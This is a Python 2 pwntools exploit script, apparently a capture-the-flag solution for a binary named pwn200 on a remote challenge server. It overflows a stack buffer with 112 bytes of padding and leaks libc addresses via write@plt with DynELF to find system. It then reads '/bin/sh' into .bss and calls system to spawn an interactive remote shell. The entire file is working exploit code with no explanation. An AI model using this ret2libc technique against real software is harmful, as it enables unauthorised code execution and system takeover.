#!  /usr/bin/env    python2

from pwn import *

sh = process("./pwn200")
sh = remote("111.198.29.45", 38409)
elf = ELF("./pwn200")

#context.log_level = "debug"

func = 0x8048484
write_plt = elf.plt["write"]
read_plt = elf.plt["read"]
ppp = 0x0804856c
start = 0x80483d0
log.info("write_got -> " + hex(write_plt))
log.info("read_got -> " + hex(read_plt))

def leak(addr):
    payload = 'a'*112 + p32(write_plt) + p32(func) + p32(1) + p32(addr) + p32(4)
    sh.sendline(payload)
    result = sh.recv(4)
    return result

print sh.recv()
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
payload = "a" * 112 + p32(start)
sh.sendline(payload)
print sh.recv()

bss_addr = elf.bss()
log.info("bss addr -> " + hex(bss_addr))
payload = 'a'*112 + p32(read_plt) + p32(ppp) + p32(0) + p32(bss_addr) + p32(8)
payload += p32(system_addr) + p32(start) + p32(bss_addr)

sh.sendline(payload)
sh.sendline("/bin/sh\0")
#payload = 'a'*112 + p32(system_addr) + p32(start) + p32(bss_addr)
#sh.sendline(payload)

sh.interactive()

